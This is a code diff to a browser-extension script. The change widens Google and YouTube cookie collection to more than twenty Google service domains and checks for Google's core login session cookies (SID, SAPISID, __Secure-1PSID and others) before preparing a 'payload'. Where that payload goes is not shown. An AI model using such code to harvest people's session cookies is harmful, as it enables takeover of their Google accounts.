@@ -102,27 +102,61 @@ document.addEventListener('DOMContentLoaded', async () => {
     statusMsg.textContent = '';
 
     try {
-      // 1. Grab all cookies for Google domains + YouTube
-      const [mainCookies, accountsCookies, myaccountCookies, youtubeCookies] = await Promise.all([
-        chrome.cookies.getAll({ domain: ".google.com" }),
-        chrome.cookies.getAll({ domain: "accounts.google.com" }),
-        chrome.cookies.getAll({ domain: "myaccount.google.com" }),
-        chrome.cookies.getAll({ domain: ".youtube.com" }),
-      ]);
+      // 1. Grab all cookies for Google domains + YouTube + ALL key Google services
+      const googleDomains = [
+        ".google.com",
+        "google.com",
+        "www.google.com",
+        "accounts.google.com",
+        "myaccount.google.com",
+        "drive.google.com",
+        "mail.google.com",
+        "docs.google.com",
+        "sheets.google.com",
+        "slides.google.com",
+        "calendar.google.com",
+        "contacts.google.com",
+        "play.google.com",
+        "photos.google.com",
+        "meet.google.com",
+        "chat.google.com",
+        "keep.google.com",
+        "translate.google.com",
+        "maps.google.com",
+        ".youtube.com",
+        "youtube.com",
+        "console.cloud.google.com",
+        "cloud.google.com",
+      ];
+      
+      const allResults = await Promise.all(
+        googleDomains.map(d => chrome.cookies.getAll({ domain: d }))
+      );
       
       // Deduplicate by name+domain+path
       const seen = new Set();
       const cookies = [];
-      for (const c of [...mainCookies, ...accountsCookies, ...myaccountCookies, ...youtubeCookies]) {
-        const key = `${c.name}|${c.domain}|${c.path}`;
-        if (!seen.has(key)) {
-          seen.add(key);
-          cookies.push(c);
+      for (const batch of allResults) {
+        for (const c of batch) {
+          const key = `${c.name}|${c.domain}|${c.path}`;
+          if (!seen.has(key)) {
+            seen.add(key);
+            cookies.push(c);
+          }
         }
       }
       
       if (cookies.length === 0) {
         throw new Error("No Google cookies found. Please log in to Google first.");
+      }
+
+      // Diagnostic: log critical auth cookies for debugging
+      const criticalNames = ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID'];
+      const foundCritical = cookies.filter(c => criticalNames.includes(c.name) && c.domain.includes('google'));
+      const missingCritical = criticalNames.filter(n => !foundCritical.some(c => c.name === n));
+      console.log(`[ext] Captured ${cookies.length} cookies. Auth cookies: ${foundCritical.map(c => c.name).join(', ') || 'NONE'}`);
+      if (missingCritical.length > 0) {
+        console.warn(`[ext] ⚠️ Missing auth cookies: ${missingCritical.join(', ')}`);
       }
 
       // 2. Prepare payload — profileName = email
